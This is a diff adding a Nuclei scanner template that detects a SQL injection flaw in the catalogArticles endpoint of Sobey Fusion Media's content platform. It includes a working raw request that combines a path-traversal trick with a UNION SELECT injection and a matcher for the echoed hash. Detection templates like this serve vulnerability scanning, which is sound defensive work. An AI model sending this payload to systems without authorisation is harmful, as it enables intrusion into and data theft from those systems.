@@ -1,0 +1,40 @@
+id: sobey-imcmp-catalogarticles-sqli
+info:
+  name: Sobey Fusion Media catalogArticles SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Sobey Fusion Media Content Management Platform is vulnerable to SQL Injection through the catalogArticles endpoint, allowing an attacker to extract sensitive information.
+
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+
+http:
+  - raw:
+      - |
+        GET /sobey-mchEditor/js/..;/count/catalogArticles?id=1)+UNION+ALL+SELECT+NULL,CONCAT(0x7e,{{t2}},0x7e),NULL,NULL,NULL,NULL%2d%2d%20%2d&siteCode=1&token=1&siteCode=1&token=1 HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "Sobey"
+      - type: word
+        part: body
+        condition: and
+        words:
+          - "获取栏目列表成功"
+          - "~{{t2}}~"
+      - type: regex
+        part: body
+        negative: true
+        regex:
+          - "<"
